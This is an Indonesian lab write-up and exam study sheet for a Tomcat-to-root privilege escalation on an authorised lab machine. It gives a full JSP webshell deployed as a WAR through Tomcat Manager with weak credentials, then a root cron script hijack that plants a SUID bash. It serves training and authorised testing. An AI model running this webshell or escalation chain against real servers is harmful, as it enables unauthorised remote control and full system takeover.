# Write-Up Privilege Escalation Lab Catalina

> **Versi ringkas untuk pelatihan dan ujian closed book**  
> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

---

## 1. Ringkasan Lab

| Komponen | Informasi |
|---|---|
| Target | `192.168.56.117` |
| Port utama | `8081/tcp` |
| Service | Apache Tomcat |
| Endpoint penting | `/manager` |
| Credential | `tomcat:s3cret` |
| Foothold | RCE sebagai user `tomcat` |
| Privilege escalation | Cron root menjalankan script writable |
| Akses akhir | `root` |

Rantai serangan:

```text
Tomcat Manager ditemukan
→ credential lemah berhasil digunakan
→ file WAR di-deploy
→ command berjalan sebagai tomcat
→ ditemukan cron root
→ script cron writable oleh group tomcat
→ payload dijalankan sebagai root
```

---

## 2. Mnemonic: M-W-C-R

```text
M = Manager
W = WAR
C = Cron
R = Root
```

Kalimat hafalan:

```text
Cari Manager, deploy WAR, periksa Cron, lalu menjadi Root.
```

Empat command konsep yang perlu diingat:

```bash
dirsearch -u http://192.168.56.117:8081

curl -u tomcat:s3cret \
  http://192.168.56.117:8081/manager/text/list

curl -u tomcat:s3cret --upload-file labcmd.war \
  "http://192.168.56.117:8081/manager/text/deploy?path=/labcmd&update=true"

curl -sG --data-urlencode "cmd=id" \
  http://192.168.56.117:8081/labcmd/cmd.jsp
```

---

# Fase 1 — Menemukan Tomcat Manager

## 3. Scan Target

```bash
TARGET="192.168.56.117"
BASE="http://$TARGET:8081"

nmap -Pn -sC -sV -p8081 "$TARGET"
```

Hasil yang dicari:

```text
8081/tcp open
Apache Tomcat
```

Lanjutkan dengan directory enumeration:

```bash
dirsearch -u "$BASE"
```

Endpoint penting:

```text
/manager
/manager/html
/manager/status
```

### Arti Status `401`

Apabila `/manager/html` menghasilkan:

```text
HTTP/1.1 401 Unauthorized
```

jangan langsung menganggap endpoint gagal.

Artinya:

```text
Endpoint ada
+
autentikasi diperlukan
```

Validasi manual:

```bash
curl -i "$BASE/manager/html"
```

Indikator:

```text
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

---

## 4. Mencari Credential

Jalankan Nikto:

```bash
nikto -h "$BASE"
```

Temuan pada lab:

```text
Username : tomcat
Password : s3cret
```

Scanner hanya memberi petunjuk. Credential harus divalidasi:

```bash
curl -s \
  -u tomcat:s3cret \
  "$BASE/manager/text/list"
```

Indikator berhasil:

```text
OK - Listed applications
```

Kesimpulan:

```text
Credential valid
+
akun dapat mengakses Tomcat Manager Text API
```

---

# Fase 2 — Deploy WAR dan Mendapatkan RCE

## 5. Membuat JSP Command Runner

Buat direktori kerja:

```bash
mkdir -p ~/catalina-lab/labcmd
cd ~/catalina-lab/labcmd
```

Buat `cmd.jsp`:

```bash
cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");

if (cmd != null) {
    Process process = new ProcessBuilder(
        "/bin/sh",
        "-c",
        cmd
    ).redirectErrorStream(true).start();

    BufferedReader reader = new BufferedReader(
        new InputStreamReader(process.getInputStream())
    );

    String line;

    out.println("<pre>");

    while ((line = reader.readLine()) != null) {
        out.println(line);
    }

    out.println("</pre>");
}
%>
EOF
```

Paketkan menjadi WAR:

```bash
cd ~/catalina-lab/labcmd
zip -r ../labcmd.war .
cd ..
```

Periksa file:

```bash
ls -lh labcmd.war
```

---

## 6. Deploy WAR

```bash
curl \
  -u tomcat:s3cret \
  --upload-file labcmd.war \
  "$BASE/manager/text/deploy?path=/labcmd&update=true"
```

Indikator berhasil:

```text
OK - Deployed application at context path [/labcmd]
```

Definisikan URL command runner:

```bash
SHELL_URL="$BASE/labcmd/cmd.jsp"
```

Uji RCE:

```bash
curl -sG \
  --data-urlencode "cmd=id" \
  "$SHELL_URL"
```

Hasil:

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

Kesimpulan:

```text
Remote Command Execution berhasil sebagai user tomcat.
```

---

# Fase 3 — Enumerasi Lokal

## 7. Konfirmasi Konteks User

```bash
curl -sG \
  --data-urlencode \
  "cmd=id; whoami; groups; hostname; pwd" \
  "$SHELL_URL"
```

Informasi penting:

```text
User     : tomcat
Group    : tomcat
Hostname : catalina
Privilege: non-root
```

Setelah memperoleh foothold, urutan pemeriksaan sederhana adalah:

```text
sudo
→ SUID
→ capability
→ cron
→ file atau service writable
→ kernel exploit
```

Pada lab Catalina, jalur yang berhasil adalah **cron**.

---

## 8. Memeriksa Cron Job

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /etc/crontab 2>/dev/null; cat /etc/cron.d/* 2>/dev/null" \
  "$SHELL_URL"
```

Temuan penting:

```cron
* * * * * root /opt/backup/backup.sh
```

Artinya:

```text
Setiap menit
→ root
→ menjalankan /opt/backup/backup.sh
```

---

## 9. Memeriksa Permission Script

```bash
curl -sG \
  --data-urlencode \
  "cmd=stat -c '%A %U %G %n' /opt/backup/backup.sh; cat /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Hasil:

```text
-rwxrwxr-x root tomcat /opt/backup/backup.sh
```

Cara membaca:

```text
Owner root    : rwx
Group tomcat  : rwx
Other         : r-x
```

User yang sedang dikuasai termasuk group `tomcat`, sehingga dapat mengubah script.

Rumus wajib hafal:

```text
Cron root + script writable oleh user rendah = privilege escalation
```

---

# Fase 4 — Membuktikan Privilege Escalation

## 10. Backup Script

Simpan script asli:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak" \
  "$SHELL_URL"
```

Periksa backup:

```bash
curl -sG \
  --data-urlencode \
  "cmd=ls -l /tmp/backup.sh.bak" \
  "$SHELL_URL"
```

---

## 11. Proof of Execution sebagai Root

Tambahkan command non-destruktif:

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\nid > /tmp/root_proof\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Setelah cron berjalan, periksa:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/root_proof; ls -l /tmp/root_proof" \
  "$SHELL_URL"
```

Indikator:

```text
uid=0(root) gid=0(root)
-rw-r--r-- 1 root root ... /tmp/root_proof
```

Bukti tersebut sudah cukup untuk menyimpulkan:

```text
Command yang ditulis user tomcat
dijalankan oleh cron sebagai root.
```

---

# Fase 5 — Mendapatkan Root

## 12. Membuat SUID Bash

Tambahkan payload berikut ke script cron:

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Setelah cron berjalan, cek:

```bash
curl -sG \
  --data-urlencode \
  "cmd=ls -l /tmp/rootbash" \
  "$SHELL_URL"
```

Indikator SUID:

```text
-rwsr-xr-x ... /tmp/rootbash
```

Huruf `s` pada permission owner menunjukkan SUID aktif.

Jalankan Bash dengan mempertahankan effective privilege:

```bash
curl -sG \
  --data-urlencode \
  "cmd=/tmp/rootbash -p -c 'id; whoami'" \
  "$SHELL_URL"
```

Hasil akhir:

```text
euid=0(root)
root
```

### Mengapa Memakai `-p`?

```text
/tmp/rootbash  = Bash yang memiliki SUID root
-p             = mempertahankan effective UID
```

Tanpa `-p`, Bash dapat menurunkan privilege demi keamanan.

---

# Fase 6 — Cleanup

## 13. Memulihkan Script

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/backup.sh.bak > /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Hapus file bukti:

```bash
curl -sG \
  --data-urlencode \
  "cmd=rm -f /tmp/root_proof /tmp/rootbash /tmp/backup.sh.bak" \
  "$SHELL_URL"
```

Undeploy aplikasi:

```bash
curl \
  -u tomcat:s3cret \
  "$BASE/manager/text/undeploy?path=/labcmd"
```

Indikator:

```text
OK - Undeployed application at context path [/labcmd]
```

Hapus file lokal:

```bash
rm -rf ~/catalina-lab
```

---

# 14. Troubleshooting Singkat

## `/manager/html` Menghasilkan `401`

Itu normal. Endpoint ada dan membutuhkan credential.

## Login Browser Berhasil, tetapi Text API Menghasilkan `403`

Akun mungkin hanya mempunyai role `manager-gui`, bukan `manager-script`. Pada lab ini, pastikan endpoint berikut mengembalikan `OK`:

```bash
curl -u tomcat:s3cret "$BASE/manager/text/list"
```

## Deploy Menghasilkan `403`

Periksa:

```text
Credential benar
Role manager-script tersedia
URL menggunakan /manager/text/deploy
File WAR benar-benar tersedia
```

## `cmd.jsp` Menghasilkan `404`

Periksa aplikasi yang ter-deploy:

```bash
curl -u tomcat:s3cret "$BASE/manager/text/list"
```

Pastikan context path:

```text
/labcmd
```

dan URL:

```text
/labcmd/cmd.jsp
```

## `root_proof` Belum Muncul

Periksa:

```text
Cron berjalan setiap menit
Script benar-benar berubah
Script tetap executable
Command tidak salah kutip
```

Validasi isi script:

```bash
curl -sG \
  --data-urlencode \
  "cmd=tail -n 10 /opt/backup/backup.sh" \
  "$SHELL_URL"
```

---

# 15. Cheat Sheet 60 Detik

```bash
TARGET="192.168.56.117"
BASE="http://$TARGET:8081"

# 1. Recon
nmap -Pn -sC -sV -p8081 "$TARGET"
dirsearch -u "$BASE"
nikto -h "$BASE"

# 2. Credential
curl -u tomcat:s3cret "$BASE/manager/text/list"

# 3. Deploy WAR
curl -u tomcat:s3cret --upload-file labcmd.war \
"$BASE/manager/text/deploy?path=/labcmd&update=true"

# 4. RCE
SHELL_URL="$BASE/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id" "$SHELL_URL"

# 5. Cron dan permission
curl -sG --data-urlencode \
"cmd=cat /etc/cron.d/backup; stat -c '%A %U %G %n' /opt/backup/backup.sh" \
"$SHELL_URL"

# 6. Backup
curl -sG --data-urlencode \
"cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak" \
"$SHELL_URL"

# 7. Rootbash
curl -sG --data-urlencode \
"cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
"$SHELL_URL"

# 8. Root
curl -sG --data-urlencode \
"cmd=/tmp/rootbash -p -c 'id; whoami'" \
"$SHELL_URL"
```

---

# 16. Ringkasan Jawaban Ujian

Apabila diminta menjelaskan lab Catalina secara lisan:

```text
Saya menemukan Apache Tomcat pada port 8081 dan endpoint
Tomcat Manager. Nikto memberi petunjuk credential tomcat:s3cret,
lalu saya memvalidasinya melalui Manager Text API.

Akun tersebut dapat melakukan deployment, sehingga saya membuat
WAR berisi JSP command runner dan memperoleh RCE sebagai user tomcat.

Pada enumerasi lokal, saya menemukan cron root yang setiap menit
menjalankan /opt/backup/backup.sh. Script tersebut dimiliki root,
tetapi writable oleh group tomcat. Saya menyisipkan command untuk
membuat Bash SUID, menunggu cron menjalankannya, lalu memakai
/tmp/rootbash -p sehingga memperoleh effective UID root.
```

Versi satu baris:

```text
Manager → credential → WAR → tomcat → cron writable → SUID Bash → root.
```
